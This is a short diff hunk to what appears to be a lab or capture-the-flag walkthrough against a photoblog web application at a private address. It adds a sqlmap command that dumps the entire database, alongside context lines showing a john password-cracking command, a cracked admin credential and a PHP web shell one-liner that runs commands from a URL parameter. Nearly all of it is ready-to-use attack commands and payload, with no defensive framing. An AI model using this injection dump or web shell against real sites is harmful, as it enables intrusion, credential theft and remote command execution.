@@ -23,6 +23,7 @@ john passwd --format=raw-md5 --wordlist=/foo --rules
 admin:P4ssw0rd
 
 OR just use SQLMAP LOL
+sqlmap -u http://192.168.1.94/cat.php?id=1 -D photoblog --dump-all --batch
 
 Now we can login to the site and upload files with embedded php
 <?php system($_GET['c']); ?>
